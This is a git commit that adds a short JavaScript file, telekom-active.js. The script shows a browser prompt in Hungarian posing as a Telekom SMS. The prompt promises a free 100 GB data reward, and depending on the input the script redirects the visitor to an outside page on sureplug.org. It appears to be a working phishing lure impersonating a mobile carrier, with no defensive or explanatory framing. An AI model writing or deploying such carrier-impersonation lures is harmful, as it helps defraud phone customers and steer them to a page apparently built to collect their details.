d5e06fd44bd1b9bfbe3e0e625dbf810644587224
surepluger <adigunkola666@gmail.com>
2025-04-28 08:27:41 +0100

    Create telekom-active.js

---
+++ telekom-active.js
@@ -0,0 +1,5 @@
+var password = '100 GB aktiválása'
+password=prompt('SMS: Gratulálunk, Telekom SIM-kártyája ingyenes adatforgalmi régi SIM-kártya jutalomra jogosult. Az aktiváláshoz kattintson az OK gombra.','100 GB aktiválása');
+if (password != '100 GB aktiválása') {
+location.href='https://sureplug.org/telekom.html';
+}
